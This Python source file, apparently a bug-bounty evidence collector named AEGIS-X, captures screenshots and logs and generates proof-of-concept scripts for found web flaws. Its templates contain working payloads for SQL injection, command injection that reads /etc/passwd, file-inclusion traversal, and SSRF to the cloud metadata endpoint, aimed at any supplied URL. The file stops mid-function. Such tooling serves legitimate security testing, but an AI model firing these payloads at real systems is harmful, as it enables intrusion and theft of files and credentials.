#!/usr/bin/env python3
"""
AEGIS-X Professional Evidence Collection System
Collects comprehensive evidence for vulnerability findings including screenshots,
PoCs, exploit code, network traces, and detailed technical documentation.
"""

import os
import json
import time
import base64
import hashlib
import asyncio
import logging
import subprocess
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, asdict
import requests
from PIL import Image, ImageDraw, ImageFont
import cv2
import numpy as np
from playwright.async_api import async_playwright
import mitmproxy
from mitmproxy import http
from mitmproxy.tools.dump import DumpMaster
from mitmproxy.options import Options

@dataclass
class EvidenceItem:
    """Represents a single piece of evidence"""
    id: str
    type: str  # screenshot, video, network_trace, exploit_code, log, document
    title: str
    description: str
    file_path: str
    metadata: Dict[str, Any]
    timestamp: str
    hash: str
    size: int
    vulnerability_id: str

@dataclass
class VulnerabilityEvidence:
    """Complete evidence package for a vulnerability"""
    vulnerability_id: str
    title: str
    severity: str
    cvss_score: float
    description: str
    impact: str
    evidence_items: List[EvidenceItem]
    poc_code: str
    exploitation_steps: List[Dict[str, str]]
    remediation: str
    references: List[str]
    created_at: str
    verified: bool
    verification_details: Dict[str, Any]

class ProfessionalEvidenceCollector:
    """
    Professional-grade evidence collection system for bug bounty findings.
    Captures comprehensive proof including visual evidence, network traces,
    exploit code, and detailed technical documentation.
    """
    
    def __init__(self, evidence_dir: str = "evidence"):
        self.evidence_dir = Path(evidence_dir)
        self.evidence_dir.mkdir(exist_ok=True)
        
        # Create subdirectories
        self.screenshots_dir = self.evidence_dir / "screenshots"
        self.videos_dir = self.evidence_dir / "videos"
        self.network_traces_dir = self.evidence_dir / "network_traces"
        self.exploits_dir = self.evidence_dir / "exploits"
        self.logs_dir = self.evidence_dir / "logs"
        self.reports_dir = self.evidence_dir / "reports"
        self.poc_dir = self.evidence_dir / "poc"
        
        for dir_path in [self.screenshots_dir, self.videos_dir, self.network_traces_dir,
                        self.exploits_dir, self.logs_dir, self.reports_dir, self.poc_dir]:
            dir_path.mkdir(exist_ok=True)
        
        self.logger = logging.getLogger("AEGIS-X.EvidenceCollector")
        self.evidence_database = {}
        self.network_capture_active = False
        self.captured_requests = []
        
    async def collect_comprehensive_evidence(self, vulnerability: Dict[str, Any]) -> VulnerabilityEvidence:
        """
        Collect comprehensive evidence for a vulnerability finding
        """
        vuln_id = vulnerability.get('id', self._generate_id())
        self.logger.info(f"🔍 Collecting comprehensive evidence for vulnerability: {vuln_id}")
        
        evidence_items = []
        
        try:
            # 1. Capture screenshots of the vulnerability
            if vulnerability.get('url'):
                screenshot_evidence = await self._capture_vulnerability_screenshots(vulnerability)
                evidence_items.extend(screenshot_evidence)
            
            # 2. Record exploitation video
            if vulnerability.get('exploitable', False):
                video_evidence = await self._record_exploitation_video(vulnerability)
                if video_evidence:
                    evidence_items.append(video_evidence)
            
            # 3. Capture network traffic
            network_evidence = await self._capture_network_evidence(vulnerability)
            if network_evidence:
                evidence_items.extend(network_evidence)
            
            # 4. Generate proof-of-concept code
            poc_evidence = await self._generate_poc_code(vulnerability)
            if poc_evidence:
                evidence_items.append(poc_evidence)
            
            # 5. Create detailed exploitation steps
            exploitation_steps = await self._document_exploitation_steps(vulnerability)
            
            # 6. Generate technical analysis
            technical_analysis = await self._generate_technical_analysis(vulnerability)
            if technical_analysis:
                evidence_items.append(technical_analysis)
            
            # 7. Collect system information
            system_evidence = await self._collect_system_evidence(vulnerability)
            evidence_items.extend(system_evidence)
            
            # Create comprehensive evidence package
            evidence_package = VulnerabilityEvidence(
                vulnerability_id=vuln_id,
                title=vulnerability.get('title', 'Unknown Vulnerability'),
                severity=vulnerability.get('severity', 'medium'),
                cvss_score=vulnerability.get('cvss_score', 0.0),
                description=vulnerability.get('description', ''),
                impact=vulnerability.get('impact', ''),
                evidence_items=evidence_items,
                poc_code=poc_evidence.file_path if poc_evidence else '',
                exploitation_steps=exploitation_steps,
                remediation=vulnerability.get('remediation', ''),
                references=vulnerability.get('references', []),
                created_at=datetime.now().isoformat(),
                verified=vulnerability.get('verified', False),
                verification_details=vulnerability.get('verification_details', {})
            )
            
            # Save evidence package
            await self._save_evidence_package(evidence_package)
            
            self.logger.info(f"✅ Comprehensive evidence collected for {vuln_id}: {len(evidence_items)} items")
            return evidence_package
            
        except Exception as e:
            self.logger.error(f"❌ Failed to collect evidence for {vuln_id}: {e}")
            raise
    
    async def _capture_vulnerability_screenshots(self, vulnerability: Dict[str, Any]) -> List[EvidenceItem]:
        """Capture detailed screenshots showing the vulnerability"""
        evidence_items = []
        url = vulnerability.get('url', '')
        
        if not url:
            return evidence_items
        
        try:
            async with async_playwright() as p:
                # Launch browser with specific settings for evidence collection
                browser = await p.chromium.launch(
                    headless=False,  # Show browser for better evidence
                    args=[
                        '--disable-web-security',
                        '--disable-features=VizDisplayCompositor',
                        '--disable-dev-shm-usage',
                        '--no-sandbox'
                    ]
                )
                
                context = await browser.new_context(
                    viewport={'width': 1920, 'height': 1080},
                    user_agent='AEGIS-X Professional Security Scanner'
                )
                
                page = await context.new_page()
                
                # Enable request/response logging
                requests_log = []
                
                async def log_request(request):
                    requests_log.append({
                        'url': request.url,
                        'method': request.method,
                        'headers': dict(request.headers),
                        'timestamp': datetime.now().isoformat()
                    })
                
                page.on('request', log_request)
                
                # Navigate to the vulnerable page
                await page.goto(url, wait_until='networkidle')
                
                # 1. Capture initial page state
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                screenshot_path = self.screenshots_dir / f"{vulnerability['id']}_initial_{timestamp}.png"
                await page.screenshot(path=str(screenshot_path), full_page=True)
                
                evidence_items.append(EvidenceItem(
                    id=self._generate_id(),
                    type='screenshot',
                    title='Initial Page State',
                    description='Screenshot of the vulnerable page before exploitation',
                    file_path=str(screenshot_path),
                    metadata={
                        'url': url,
                        'viewport': '1920x1080',
                        'full_page': True,
                        'browser': 'chromium'
                    },
                    timestamp=datetime.now().isoformat(),
                    hash=self._calculate_file_hash(screenshot_path),
                    size=screenshot_path.stat().st_size,
                    vulnerability_id=vulnerability['id']
                ))
                
                # 2. Execute vulnerability payload and capture result
                if vulnerability.get('payload'):
                    payload = vulnerability['payload']
                    vuln_type = vulnerability.get('type', '').lower()
                    
                    if vuln_type == 'xss':
                        # For XSS, inject payload and capture alert
                        try:
                            if vulnerability.get('parameter'):
                                # URL parameter injection
                                exploit_url = f"{url}?{vulnerability['parameter']}={payload}"
                                await page.goto(exploit_url)
                            else:
                                # Form field injection
                                await page.fill('input[type="text"], textarea', payload)
                                await page.click('input[type="submit"], button[type="submit"]')
                            
                            # Wait for potential alert and capture
                            await page.wait_for_timeout(2000)
                            
                            exploit_screenshot_path = self.screenshots_dir / f"{vulnerability['id']}_exploit_{timestamp}.png"
                            await page.screenshot(path=str(exploit_screenshot_path), full_page=True)
                            
                            evidence_items.append(EvidenceItem(
                                id=self._generate_id(),
                                type='screenshot',
                                title='XSS Exploitation Result',
                                description='Screenshot showing successful XSS payload execution',
                                file_path=str(exploit_screenshot_path),
                                metadata={
                                    'url': page.url,
                                    'payload': payload,
                                    'vulnerability_type': 'xss',
                                    'exploitation_method': 'payload_injection'
                                },
                                timestamp=datetime.now().isoformat(),
                                hash=self._calculate_file_hash(exploit_screenshot_path),
                                size=exploit_screenshot_path.stat().st_size,
                                vulnerability_id=vulnerability['id']
                            ))
                            
                        except Exception as e:
                            self.logger.warning(f"Failed to capture XSS exploitation: {e}")
                    
                    elif vuln_type == 'sqli':
                        # For SQL injection, capture error messages or data disclosure
                        try:
                            if vulnerability.get('parameter'):
                                exploit_url = f"{url}?{vulnerability['parameter']}={payload}"
                                await page.goto(exploit_url)
                                
                                # Wait for page to load and capture
                                await page.wait_for_timeout(3000)
                                
                                sqli_screenshot_path = self.screenshots_dir / f"{vulnerability['id']}_sqli_{timestamp}.png"
                                await page.screenshot(path=str(sqli_screenshot_path), full_page=True)
                                
                                # Capture page source for analysis
                                page_source = await page.content()
                                source_path = self.logs_dir / f"{vulnerability['id']}_sqli_response_{timestamp}.html"
                                with open(source_path, 'w', encoding='utf-8') as f:
                                    f.write(page_source)
                                
                                evidence_items.extend([
                                    EvidenceItem(
                                        id=self._generate_id(),
                                        type='screenshot',
                                        title='SQL Injection Exploitation',
                                        description='Screenshot showing SQL injection payload results',
                                        file_path=str(sqli_screenshot_path),
                                        metadata={
                                            'url': page.url,
                                            'payload': payload,
                                            'vulnerability_type': 'sqli',
                                            'parameter': vulnerability['parameter']
                                        },
                                        timestamp=datetime.now().isoformat(),
                                        hash=self._calculate_file_hash(sqli_screenshot_path),
                                        size=sqli_screenshot_path.stat().st_size,
                                        vulnerability_id=vulnerability['id']
                                    ),
                                    EvidenceItem(
                                        id=self._generate_id(),
                                        type='log',
                                        title='SQL Injection Response Source',
                                        description='HTML source code showing SQL injection results',
                                        file_path=str(source_path),
                                        metadata={
                                            'content_type': 'text/html',
                                            'payload': payload,
                                            'vulnerability_type': 'sqli'
                                        },
                                        timestamp=datetime.now().isoformat(),
                                        hash=self._calculate_file_hash(source_path),
                                        size=source_path.stat().st_size,
                                        vulnerability_id=vulnerability['id']
                                    )
                                ])
                                
                        except Exception as e:
                            self.logger.warning(f"Failed to capture SQL injection exploitation: {e}")
                
                # 3. Capture network requests log
                if requests_log:
                    requests_log_path = self.logs_dir / f"{vulnerability['id']}_requests_{timestamp}.json"
                    with open(requests_log_path, 'w') as f:
                        json.dump(requests_log, f, indent=2)
                    
                    evidence_items.append(EvidenceItem(
                        id=self._generate_id(),
                        type='log',
                        title='Network Requests Log',
                        description='Log of all network requests during vulnerability testing',
                        file_path=str(requests_log_path),
                        metadata={
                            'request_count': len(requests_log),
                            'content_type': 'application/json'
                        },
                        timestamp=datetime.now().isoformat(),
                        hash=self._calculate_file_hash(requests_log_path),
                        size=requests_log_path.stat().st_size,
                        vulnerability_id=vulnerability['id']
                    ))
                
                await browser.close()
                
        except Exception as e:
            self.logger.error(f"Failed to capture vulnerability screenshots: {e}")
        
        return evidence_items
    
    async def _record_exploitation_video(self, vulnerability: Dict[str, Any]) -> Optional[EvidenceItem]:
        """Record a video showing the vulnerability exploitation process"""
        try:
            # This would require screen recording capabilities
            # For now, we'll create a placeholder that documents the process
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            video_script_path = self.videos_dir / f"{vulnerability['id']}_exploitation_script_{timestamp}.md"
            
            script_content = f"""# Vulnerability Exploitation Video Script

## Vulnerability Details
- **ID**: {vulnerability['id']}
- **Type**: {vulnerability.get('type', 'Unknown')}
- **Severity**: {vulnerability.get('severity', 'Unknown')}
- **URL**: {vulnerability.get('url', 'N/A')}

## Exploitation Steps
1. Navigate to vulnerable endpoint: {vulnerability.get('url', 'N/A')}
2. Identify vulnerable parameter: {vulnerability.get('parameter', 'N/A')}
3. Inject payload: {vulnerability.get('payload', 'N/A')}
4. Observe results and confirm exploitation

## Expected Results
{vulnerability.get('expected_result', 'Vulnerability successfully exploited')}

## Impact
{vulnerability.get('impact', 'Security vulnerability confirmed')}

---
*Generated by AEGIS-X Professional Evidence Collector*
*Timestamp: {datetime.now().isoformat()}*
"""
            
            with open(video_script_path, 'w') as f:
                f.write(script_content)
            
            return EvidenceItem(
                id=self._generate_id(),
                type='document',
                title='Exploitation Video Script',
                description='Detailed script for vulnerability exploitation demonstration',
                file_path=str(video_script_path),
                metadata={
                    'content_type': 'text/markdown',
                    'vulnerability_type': vulnerability.get('type', 'unknown')
                },
                timestamp=datetime.now().isoformat(),
                hash=self._calculate_file_hash(video_script_path),
                size=video_script_path.stat().st_size,
                vulnerability_id=vulnerability['id']
            )
            
        except Exception as e:
            self.logger.error(f"Failed to create exploitation video script: {e}")
            return None
    
    async def _capture_network_evidence(self, vulnerability: Dict[str, Any]) -> List[EvidenceItem]:
        """Capture network traffic evidence"""
        evidence_items = []
        
        try:
            # Create a detailed HTTP request/response log
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            if vulnerability.get('http_request'):
                # Save the malicious HTTP request
                request_path = self.network_traces_dir / f"{vulnerability['id']}_request_{timestamp}.txt"
                with open(request_path, 'w') as f:
                    f.write(vulnerability['http_request'])
                
                evidence_items.append(EvidenceItem(
                    id=self._generate_id(),
                    type='network_trace',
                    title='Malicious HTTP Request',
                    description='HTTP request used to exploit the vulnerability',
                    file_path=str(request_path),
                    metadata={
                        'content_type': 'text/plain',
                        'request_type': 'exploitation'
                    },
                    timestamp=datetime.now().isoformat(),
                    hash=self._calculate_file_hash(request_path),
                    size=request_path.stat().st_size,
                    vulnerability_id=vulnerability['id']
                ))
            
            if vulnerability.get('http_response'):
                # Save the vulnerable HTTP response
                response_path = self.network_traces_dir / f"{vulnerability['id']}_response_{timestamp}.txt"
                with open(response_path, 'w') as f:
                    f.write(vulnerability['http_response'])
                
                evidence_items.append(EvidenceItem(
                    id=self._generate_id(),
                    type='network_trace',
                    title='Vulnerable HTTP Response',
                    description='HTTP response showing vulnerability exploitation results',
                    file_path=str(response_path),
                    metadata={
                        'content_type': 'text/plain',
                        'response_type': 'vulnerable'
                    },
                    timestamp=datetime.now().isoformat(),
                    hash=self._calculate_file_hash(response_path),
                    size=response_path.stat().st_size,
                    vulnerability_id=vulnerability['id']
                ))
            
            # Generate curl command for manual verification
            curl_command = self._generate_curl_command(vulnerability)
            if curl_command:
                curl_path = self.network_traces_dir / f"{vulnerability['id']}_curl_command_{timestamp}.sh"
                with open(curl_path, 'w') as f:
                    f.write(f"#!/bin/bash\n# AEGIS-X Generated Curl Command for Manual Verification\n\n")
                    f.write(curl_command)
                
                evidence_items.append(EvidenceItem(
                    id=self._generate_id(),
                    type='exploit_code',
                    title='Manual Verification Curl Command',
                    description='Curl command for manual vulnerability verification',
                    file_path=str(curl_path),
                    metadata={
                        'content_type': 'application/x-shellscript',
                        'verification_method': 'manual'
                    },
                    timestamp=datetime.now().isoformat(),
                    hash=self._calculate_file_hash(curl_path),
                    size=curl_path.stat().st_size,
                    vulnerability_id=vulnerability['id']
                ))
                
        except Exception as e:
            self.logger.error(f"Failed to capture network evidence: {e}")
        
        return evidence_items
    
    async def _generate_poc_code(self, vulnerability: Dict[str, Any]) -> Optional[EvidenceItem]:
        """Generate proof-of-concept exploit code"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            poc_path = self.poc_dir / f"{vulnerability['id']}_poc_{timestamp}.py"
            
            vuln_type = vulnerability.get('type', '').lower()
            url = vulnerability.get('url', '')
            payload = vulnerability.get('payload', '')
            parameter = vulnerability.get('parameter', '')
            
            # Generate PoC based on vulnerability type
            if vuln_type == 'xss':
                poc_code = self._generate_xss_poc(url, parameter, payload)
            elif vuln_type == 'sqli':
                poc_code = self._generate_sqli_poc(url, parameter, payload)
            elif vuln_type == 'rce':
                poc_code = self._generate_rce_poc(url, parameter, payload)
            elif vuln_type == 'lfi':
                poc_code = self._generate_lfi_poc(url, parameter, payload)
            elif vuln_type == 'ssrf':
                poc_code = self._generate_ssrf_poc(url, parameter, payload)
            else:
                poc_code = self._generate_generic_poc(vulnerability)
            
            with open(poc_path, 'w') as f:
                f.write(poc_code)
            
            return EvidenceItem(
                id=self._generate_id(),
                type='exploit_code',
                title='Proof-of-Concept Exploit',
                description=f'Python PoC code for {vuln_type.upper()} vulnerability',
                file_path=str(poc_path),
                metadata={
                    'language': 'python',
                    'vulnerability_type': vuln_type,
                    'target_url': url,
                    'payload': payload
                },
                timestamp=datetime.now().isoformat(),
                hash=self._calculate_file_hash(poc_path),
                size=poc_path.stat().st_size,
                vulnerability_id=vulnerability['id']
            )
            
        except Exception as e:
            self.logger.error(f"Failed to generate PoC code: {e}")
            return None
    
    def _generate_xss_poc(self, url: str, parameter: str, payload: str) -> str:
        """Generate XSS proof-of-concept code"""
        return f'''#!/usr/bin/env python3
"""
AEGIS-X Generated XSS Proof-of-Concept
Target: {url}
Parameter: {parameter}
Payload: {payload}
"""

import requests
import urllib.parse
from bs4 import BeautifulSoup

def exploit_xss():
    """Exploit XSS vulnerability"""
    target_url = "{url}"
    vulnerable_param = "{parameter}"
    xss_payload = "{payload}"
    
    print(f"[+] Targeting: {{target_url}}")
    print(f"[+] Parameter: {{vulnerable_param}}")
    print(f"[+] Payload: {{xss_payload}}")
    
    # URL encode the payload
    encoded_payload = urllib.parse.quote(xss_payload)
    
    # Construct exploit URL
    if "?" in target_url:
        exploit_url = f"{{target_url}}&{{vulnerable_param}}={{encoded_payload}}"
    else:
        exploit_url = f"{{target_url}}?{{vulnerable_param}}={{encoded_payload}}"
    
    print(f"[+] Exploit URL: {{exploit_url}}")
    
    try:
        # Send malicious request
        response = requests.get(exploit_url, timeout=10)
        
        print(f"[+] Response Status: {{response.status_code}}")
        
        # Check if payload is reflected
        if xss_payload in response.text:
            print("[+] SUCCESS: XSS payload reflected in response!")
            print("[+] Vulnerability confirmed!")
            
            # Extract context where payload appears
            soup = BeautifulSoup(response.text, 'html.parser')
            print(f"[+] Response length: {{len(response.text)}} characters")
            
            return True
        else:
            print("[-] Payload not found in response")
            return False
            
    except requests.RequestException as e:
        print(f"[-] Request failed: {{e}}")
        return False

if __name__ == "__main__":
    print("AEGIS-X XSS Proof-of-Concept")
    print("=" * 40)
    exploit_xss()
'''
    
    def _generate_sqli_poc(self, url: str, parameter: str, payload: str) -> str:
        """Generate SQL injection proof-of-concept code"""
        return f'''#!/usr/bin/env python3
"""
AEGIS-X Generated SQL Injection Proof-of-Concept
Target: {url}
Parameter: {parameter}
Payload: {payload}
"""

import requests
import urllib.parse
import re
import time

def exploit_sqli():
    """Exploit SQL injection vulnerability"""
    target_url = "{url}"
    vulnerable_param = "{parameter}"
    sqli_payload = "{payload}"
    
    print(f"[+] Targeting: {{target_url}}")
    print(f"[+] Parameter: {{vulnerable_param}}")
    print(f"[+] Payload: {{sqli_payload}}")
    
    # Test payloads for different SQL injection types
    test_payloads = [
        sqli_payload,
        "' OR '1'='1",
        "' UNION SELECT NULL,NULL,NULL--",
        "'; WAITFOR DELAY '00:00:05'--",
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
    ]
    
    for payload in test_payloads:
        print(f"\\n[+] Testing payload: {{payload}}")
        
        # URL encode the payload
        encoded_payload = urllib.parse.quote(payload)
        
        # Construct exploit URL
        if "?" in target_url:
            exploit_url = f"{{target_url}}&{{vulnerable_param}}={{encoded_payload}}"
        else:
            exploit_url = f"{{target_url}}?{{vulnerable_param}}={{encoded_payload}}"
        
        try:
            start_time = time.time()
            response = requests.get(exploit_url, timeout=15)
            response_time = time.time() - start_time
            
            print(f"[+] Response Status: {{response.status_code}}")
            print(f"[+] Response Time: {{response_time:.2f}} seconds")
            
            # Check for SQL error messages
            sql_errors = [
                "mysql_fetch_array",
                "ORA-01756",
                "Microsoft OLE DB Provider for ODBC Drivers",
                "PostgreSQL query failed",
                "Warning: mysql_",
                "valid MySQL result",
                "MySqlClient.",
                "SQLException"
            ]
            
            for error in sql_errors:
                if error.lower() in response.text.lower():
                    print(f"[+] SUCCESS: SQL error detected - {{error}}")
                    print("[+] SQL Injection vulnerability confirmed!")
                    return True
            
            # Check for time-based injection (if response took longer than expected)
            if "WAITFOR DELAY" in payload and response_time > 4:
                print("[+] SUCCESS: Time-based SQL injection detected!")
                print(f"[+] Response delayed by {{response_time:.2f}} seconds")
                return True
            
            # Check for union-based injection
            if "UNION SELECT" in payload and response.status_code == 200:
                if len(response.text) != len(requests.get(target_url).text):
                    print("[+] SUCCESS: Union-based SQL injection possible!")
                    return True
                    
        except requests.RequestException as e:
            print(f"[-] Request failed: {{e}}")
    
    print("[-] No SQL injection detected with test payloads")
    return False

if __name__ == "__main__":
    print("AEGIS-X SQL Injection Proof-of-Concept")
    print("=" * 45)
    exploit_sqli()
'''
    
    def _generate_rce_poc(self, url: str, parameter: str, payload: str) -> str:
        """Generate RCE proof-of-concept code"""
        return f'''#!/usr/bin/env python3
"""
AEGIS-X Generated RCE Proof-of-Concept
Target: {url}
Parameter: {parameter}
Payload: {payload}
"""

import requests
import urllib.parse
import base64

def exploit_rce():
    """Exploit Remote Code Execution vulnerability"""
    target_url = "{url}"
    vulnerable_param = "{parameter}"
    rce_payload = "{payload}"
    
    print(f"[+] Targeting: {{target_url}}")
    print(f"[+] Parameter: {{vulnerable_param}}")
    print(f"[+] Payload: {{rce_payload}}")
    
    # Test different RCE payloads
    test_payloads = [
        rce_payload,
        "; id",
        "| whoami",
        "&& uname -a",
        "`cat /etc/passwd`",
        "$(id)",
        "; cat /proc/version"
    ]
    
    for payload in test_payloads:
        print(f"\\n[+] Testing payload: {{payload}}")
        
        # URL encode the payload
        encoded_payload = urllib.parse.quote(payload)
        
        # Construct exploit URL
        if "?" in target_url:
            exploit_url = f"{{target_url}}&{{vulnerable_param}}={{encoded_payload}}"
        else:
            exploit_url = f"{{target_url}}?{{vulnerable_param}}={{encoded_payload}}"
        
        try:
            response = requests.get(exploit_url, timeout=10)
            
            print(f"[+] Response Status: {{response.status_code}}")
            
            # Check for command execution indicators
            rce_indicators = [
                "uid=",
                "gid=",
                "Linux",
                "Windows",
                "root:",
                "/bin/bash",
                "/bin/sh",
                "Microsoft Windows"
            ]
            
            for indicator in rce_indicators:
                if indicator in response.text:
                    print(f"[+] SUCCESS: RCE indicator detected - {{indicator}}")
                    print("[+] Remote Code Execution vulnerability confirmed!")
                    print(f"[+] Command output found in response")
                    
                    # Extract and display command output
                    lines = response.text.split('\\n')
                    for line in lines:
                        if any(ind in line for ind in rce_indicators):
                            print(f"[+] Output: {{line.strip()}}")
                    
                    return True
                    
        except requests.RequestException as e:
            print(f"[-] Request failed: {{e}}")
    
    print("[-] No RCE detected with test payloads")
    return False

if __name__ == "__main__":
    print("AEGIS-X RCE Proof-of-Concept")
    print("=" * 35)
    exploit_rce()
'''
    
    def _generate_lfi_poc(self, url: str, parameter: str, payload: str) -> str:
        """Generate LFI proof-of-concept code"""
        return f'''#!/usr/bin/env python3
"""
AEGIS-X Generated LFI Proof-of-Concept
Target: {url}
Parameter: {parameter}
Payload: {payload}
"""

import requests
import urllib.parse

def exploit_lfi():
    """Exploit Local File Inclusion vulnerability"""
    target_url = "{url}"
    vulnerable_param = "{parameter}"
    lfi_payload = "{payload}"
    
    print(f"[+] Targeting: {{target_url}}")
    print(f"[+] Parameter: {{vulnerable_param}}")
    print(f"[+] Payload: {{lfi_payload}}")
    
    # Test different LFI payloads
    test_payloads = [
        lfi_payload,
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
        "/etc/passwd%00",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "/proc/self/environ",
        "/var/log/apache2/access.log"
    ]
    
    for payload in test_payloads:
        print(f"\\n[+] Testing payload: {{payload}}")
        
        # URL encode the payload
        encoded_payload = urllib.parse.quote(payload)
        
        # Construct exploit URL
        if "?" in target_url:
            exploit_url = f"{{target_url}}&{{vulnerable_param}}={{encoded_payload}}"
        else:
            exploit_url = f"{{target_url}}?{{vulnerable_param}}={{encoded_payload}}"
        
        try:
            response = requests.get(exploit_url, timeout=10)
            
            print(f"[+] Response Status: {{response.status_code}}")
            
            # Check for LFI indicators
            lfi_indicators = [
                "root:x:0:0:",
                "daemon:x:",
                "www-data:",
                "# localhost",
                "127.0.0.1",
                "<?php",
                "HTTP_HOST",
                "DOCUMENT_ROOT"
            ]
            
            for indicator in lfi_indicators:
                if indicator in response.text:
                    print(f"[+] SUCCESS: LFI indicator detected - {{indicator}}")
                    print("[+] Local File Inclusion vulnerability confirmed!")
                    
                    # Show first few lines of included file
                    lines = response.text.split('\\n')[:10]
                    print("[+] File content preview:")
                    for i, line in enumerate(lines, 1):
                        if line.strip():
                            print(f"    {{i:2d}}: {{line.strip()[:80]}}")
                    
                    return True
                    
        except requests.RequestException as e:
            print(f"[-] Request failed: {{e}}")
    
    print("[-] No LFI detected with test payloads")
    return False

if __name__ == "__main__":
    print("AEGIS-X LFI Proof-of-Concept")
    print("=" * 35)
    exploit_lfi()
'''
    
    def _generate_ssrf_poc(self, url: str, parameter: str, payload: str) -> str:
        """Generate SSRF proof-of-concept code"""
        return f'''#!/usr/bin/env python3
"""
AEGIS-X Generated SSRF Proof-of-Concept
Target: {url}
Parameter: {parameter}
Payload: {payload}
"""

import requests
import urllib.parse
import time

def exploit_ssrf():
    """Exploit Server-Side Request Forgery vulnerability"""
    target_url = "{url}"
    vulnerable_param = "{parameter}"
    ssrf_payload = "{payload}"
    
    print(f"[+] Targeting: {{target_url}}")
    print(f"[+] Parameter: {{vulnerable_param}}")
    print(f"[+] Payload: {{ssrf_payload}}")
    
    # Test different SSRF payloads
    test_payloads = [
        ssrf_payload,
        "http://127.0.0.1:80",
        "http://localhost:22",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "gopher://127.0.0.1:25/",
        "dict://127.0.0.1:11211/",
        "http://[::1]:80",
        "http://0.0.0.0:80"
    ]
    
    for payload in test_payloads:
        print(f"\\n[+] Testing payload: {{payload}}")
        
        # URL encode the payload
        encoded_payload = urllib.parse.quote(payload)
        
        # Construct exploit URL
        if "?" in target_url:
            exploit_url = f"{{target_url}}&{{vulnerable_param}}={{encoded_payload}}"
        else:
            exploit_url = f"{{target_url}}?{{vulnerable_param}}={{encoded_payload}}"
        
        try:
            start_time = time.time()
            response = requests.get(exploit_url, timeout=15)
            response_time = time.time() - start_time
            
            print(f"[+] Response Status: {{response.status_code}}")
            print(f"[+] Response Time: {{response_time:.2f}} seconds")
            print(f"[+] Response Length: {{len(response.text)}} characters")
            
            # Check for SSRF indicators
            ssrf_indicators = [
                "root:x:0:0:",
                "SSH-2.0",
                "instance-id",
                "ami-id",
                "security-groups",
                "Connection refused",
                "Connection timeout",
                "Internal Server Error"
            ]
            
            for indicator in ssrf_indicators:
                if indicator in response.text:
                    print(f"[+] SUCCESS: SSRF indicator detected - {{indicator}}")
                    print("[+] Server-Side Request Forgery vulnerability confirmed!")
                    
                    # Show response preview
                    preview = response.text[:500]
                    print(f"[+] Response preview: {{preview}}")
                    
                    return True
            
            # Check for AWS metadata access
            if "169.254.169.254" in payload and response.status_code == 200:
                if len(response.text) > 0:
                    print("[+] SUCCESS: AWS metadata endpoint accessible!")
                    print("[+] SSRF vulnerability confirmed!")
                    return True
                    
        except requests.RequestException as e:
            print(f"[-] Request failed: {{e}}")
    
    print("[-] No SSRF detected with test payloads")
    return False

if __name__ == "__main__":
    print("AEGIS-X SSRF Proof-of-Concept")
    print("=" * 36)
    exploit_ssrf()
'''
    
    def _generate_generic_poc(self, vulnerability: Dict[str, Any]) -> str:
        """Generate generic proof-of-concept code"""
        return f'''#!/usr/bin/env python3
"""
AEGIS-X Generated Generic Proof-of-Concept
Vulnerability: {vulnerability.get('title', 'Unknown')}
Type: {vulnerability.get('type', 'Unknown')}
Severity: {vulnerability.get('severity', 'Unknown')}
"""

import requests
import urllib.parse
import json

def exploit_vulnerability():
    """Generic vulnerability exploitation"""
    target_url = "{vulnerability.get('url', '')}"
    vuln_type = "{vulnerability.get('type', 'unknown')}"
    payload = "{vulnerability.get('payload', '')}"
    parameter = "{vulnerability.get('parameter', '')}"
    
    print(f"[+] Targeting: {{target_url}}")
    print(f"[+] Vulnerability Type: {{vuln_type}}")
    print(f"[+] Parameter: {{parameter}}")
    print(f"[+] Payload: {{payload}}")
    
    try:
        # Construct exploit URL
        if parameter and payload:
            encoded_payload = urllib.parse.quote(payload)
            if "?" in target_url:
                exploit_url = f"{{target_url}}&{{parameter}}={{encoded_payload}}"
            else:
                exploit_url = f"{{target_url}}?{{parameter}}={{encoded_payload}}"
        else:
            exploit_url = target_url
        
        print(f"[+] Exploit URL: {{exploit_url}}")
        
        # Send request
        response = requests.get(exploit_url, timeout=10)
        
        print(f"[+] Response Status: {{response.status_code}}")
        print(f"[+] Response Length: {{len(response.text)}} characters")
        
        # Basic vulnerability detection
        if payload and payload in response.text:
            print("[+] SUCCESS: Payload reflected in response!")
            print("[+] Vulnerability likely confirmed!")
            return True
        elif response.status_code != 200:
            print(f"[+] Unusual response status: {{response.status_code}}")
            print("[+] May indicate vulnerability")
            return True
        else:
            print("[-] No obvious vulnerability indicators found")
            return False
            
    except requests.RequestException as e:
        print(f"[-] Request failed: {{e}}")
        return False

if __name__ == "__main__":
    print("AEGIS-X Generic Vulnerability PoC")
    print("=" * 40)
    exploit_vulnerability()
'''
    
    async def _document_exploitation_steps(self, vulnerability: Dict[str, Any]) -> List[Dict[str, str]]:
        """Document detailed exploitation steps"""
        steps = []
        
        vuln_type = vulnerability.get('type', '').lower()
        url = vulnerability.get('url', '')
        parameter = vulnerability.get('parameter', '')
        payload = vulnerability.get('payload', '')
        
        # Generic steps
        steps.append({
            'step': '1',
            'title': 'Target Identification',
            'description': f'Identify vulnerable endpoint: {url}',
            'command': f'curl -X GET "{url}"',
            'expected_result': 'Confirm target is accessible and responsive'
        })
        
        steps.append({
            'step': '2',
            'title': 'Parameter Discovery',
            'description': f'Identify vulnerable parameter: {parameter}',
            'command': f'curl -X GET "{url}?{parameter}=test"',
            'expected_result': 'Confirm parameter is processed by the application'
        })
        
        # Vulnerability-specific steps
        if vuln_type == 'xss':
            steps.extend([
                {
                    'step': '3',
                    'title': 'XSS Payload Injection',
                    'description': 'Inject XSS payload to test for script execution',
                    'command': f'curl -X GET "{url}?{parameter}={urllib.parse.quote(payload)}"',
                    'expected_result': 'Payload should be reflected in the response without proper encoding'
                },
                {
                    'step': '4',
                    'title': 'Browser Verification',
                    'description': 'Verify XSS execution in a real browser',
                    'command': f'Open browser and navigate to: {url}?{parameter}={urllib.parse.quote(payload)}',
